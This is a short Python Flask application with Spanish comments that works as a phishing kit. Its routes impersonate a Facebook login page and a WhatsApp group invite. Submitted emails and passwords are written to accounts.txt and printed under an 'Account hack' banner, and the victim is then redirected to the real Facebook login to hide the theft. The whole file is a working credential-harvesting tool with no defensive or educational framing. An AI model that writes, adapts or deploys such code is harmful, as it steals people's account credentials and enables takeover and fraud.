from flask import Flask, flash, render_template, request, redirect, url_for, abort, session, escape, make_response, send_from_directory #el modulo de Flask

import os, random
app=Flask(__name__) #la aplicación
app.secret_key="key" #un código secreto, para realizar peticiones GET, POST


@app.route("/")
def Index():
	return redirect("admin")



@app.route("/admin", methods=["GET","POST"])
def admin():
	return render_template("/admin.html")


@app.route("/chat.whatsapp.com/C9834gh9g5hgg45hj6j65j56het3", methods=["GET","POST"])
def invite():
	return render_template("/whatsapp.html")
@app.route("/facebook.com/login", methods=["GET","POST"]) #Crea un link
def facebook(): # Se ejecuta lo que esta adentro cuando entran al link
	if request.method=="POST":
		email=request.form.get('email');
		passs=request.form.get('pass');
		if email!=None and passs!=None:
			file = open("accounts.txt" , "a+")
			file.write("Email: " + email +"\nPassword: " + passs + "\n\n")
			file.close()
			print("\033[92m---Account hack------")
			print("\033[91mEmail: " + email)
			print("\033[91mPass: " + passs)	
			print("\033[92m---------------------")
			
			return redirect("https://m.facebook.com/login/?ref=dbl&fl")
	return render_template("/index.html")


if __name__ == "__main__":
	app.run(debug=True, port=5000)
